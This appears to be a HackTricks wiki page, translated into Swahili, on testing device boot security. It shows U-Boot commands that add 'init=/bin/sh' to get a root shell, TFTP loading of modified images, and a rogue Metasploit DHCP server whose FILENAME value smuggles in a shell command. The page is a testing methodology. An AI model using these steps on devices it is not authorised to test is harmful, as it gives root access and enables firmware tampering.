{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

Hatua zifuatazo zinapendekezwa kwa kubadilisha mipangilio ya kuanzisha kifaa na bootloaders kama U-boot:

1. **Fikia Shell ya Mfasiri wa Bootloader**:
- Wakati wa kuanzisha, bonyeza "0", nafasi, au "mifumo ya uchawi" nyingine ili kufikia shell ya mfasiri wa bootloader.

2. **Badilisha Hoja za Boot**:
- Tekeleza amri zifuatazo kuongeza '`init=/bin/sh`' kwenye hoja za boot, kuruhusu utekelezaji wa amri ya shell:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **Weka Server ya TFTP**:
- Sanidi server ya TFTP ili kupakia picha kupitia mtandao wa ndani:
%%%
#setenv ipaddr 192.168.2.2 #IP ya ndani ya kifaa
#setenv serverip 192.168.2.1 #IP ya server ya TFTP
#saveenv
#reset
#ping 192.168.2.1 #angalia ufikiaji wa mtandao
#tftp ${loadaddr} uImage-3.6.35 #loadaddr inachukua anwani ya kupakia faili na jina la picha kwenye server ya TFTP
%%%

4. **Tumia `ubootwrite.py`**:
- Tumia `ubootwrite.py` kuandika picha ya U-boot na kusukuma firmware iliyobadilishwa ili kupata ufikiaji wa root.

5. **Angalia Vipengele vya Debug**:
- Thibitisha ikiwa vipengele vya debug kama vile logging ya kina, kupakia kernels zisizo na uhakika, au kuanzisha kutoka vyanzo visivyoaminika vimewezeshwa.

6. **Uingiliaji wa Kihardware wa Tahadhari**:
- Kuwa makini unapounganisha pini moja na ardhi na kuingiliana na SPI au NAND flash chips wakati wa mchakato wa kuanzisha kifaa, hasa kabla ya kernel kufunguka. Kagua karatasi ya data ya NAND flash chip kabla ya kufupisha pini.

7. **Sanidi Server ya DHCP ya Ulaghai**:
- Sanidi server ya DHCP ya ulaghai yenye vigezo vya uharibifu ili kifaa kiweze kuyakubali wakati wa kuanzisha PXE. Tumia zana kama server ya DHCP ya msaada ya Metasploit (MSF). Badilisha parameter ya 'FILENAME' kwa amri za kuingiza kama `'a";/bin/sh;#'` ili kujaribu uthibitishaji wa ingizo kwa taratibu za kuanzisha kifaa.

**Kumbuka**: Hatua zinazohusisha mwingiliano wa kimwili na pini za kifaa (*zilizowekwa alama na nyota) zinapaswa kuchukuliwa kwa tahadhari kubwa ili kuepuka kuharibu kifaa.


## Marejeo
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
